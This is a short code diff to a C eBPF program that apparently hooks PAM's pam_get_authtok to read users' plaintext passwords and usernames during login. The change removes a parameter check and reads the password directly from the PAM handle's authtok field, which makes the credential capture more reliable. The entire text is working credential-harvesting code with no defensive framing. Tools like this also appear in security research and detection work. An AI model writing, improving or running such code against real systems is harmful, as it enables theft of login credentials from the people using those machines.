@@ -55,9 +55,6 @@ int trace_pam_get_authtok(struct pt_regs *ctx)
   if (!PT_REGS_PARM1(ctx))
     return 0;
 
-  if (!PT_REGS_PARM3(ctx))
-    return 0;
-
   pam_handle_t* phandle = (pam_handle_t*)PT_REGS_PARM1(ctx);
 
   // Get current PID to track
@@ -65,7 +62,7 @@ int trace_pam_get_authtok(struct pt_regs *ctx)
 
   // retrieve output parameter
   u64 password_addr = 0;
-  bpf_probe_read(&password_addr, sizeof(password_addr), (void *)PT_REGS_PARM3(ctx));
+  bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);
 
   u64 username_addr = 0;
   bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);
